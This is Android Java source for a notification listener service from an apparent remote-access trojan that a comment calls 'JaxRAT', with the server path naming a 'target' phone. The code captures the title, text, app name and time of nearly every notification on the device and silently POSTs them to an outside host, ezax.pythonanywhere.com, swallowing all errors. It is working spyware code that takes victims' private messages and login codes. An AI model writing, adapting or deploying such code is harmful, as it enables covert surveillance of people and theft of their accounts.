package com.ezax.agent;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationService extends NotificationListenerService {
    private static final String SERVER_URL = "https://ezax.pythonanywhere.com/api/upload_notification/hp_target_1"; // SESUAIKAN IP

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        
        // Abaikan notif dari JaxRAT sendiri & Abaikan Gmail (biar fokus ke Accessibility)
        if (packageName.equals(getPackageName()) || packageName.equals("com.google.android.gm")) return;

        Bundle extras = sbn.getNotification().extras;
        if (extras == null) return;

        String title = extras.getString(Notification.EXTRA_TITLE, "Tanpa Judul");
        CharSequence textChar = extras.getCharSequence(Notification.EXTRA_TEXT);
        String text = textChar != null ? textChar.toString() : "Tanpa Pesan";
        String time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date(sbn.getPostTime()));

        kirimKeWeb(packageName, title, text, time);
    }

    private void kirimKeWeb(String app, String title, String text, String time) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                JSONObject json = new JSONObject();
                json.put("app", app);
                json.put("title", title);
                json.put("text", text);
                json.put("time", time);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes("utf-8"));
                }
                conn.getResponseCode();
            } catch (Exception e) { }
        }).start();
    }
}
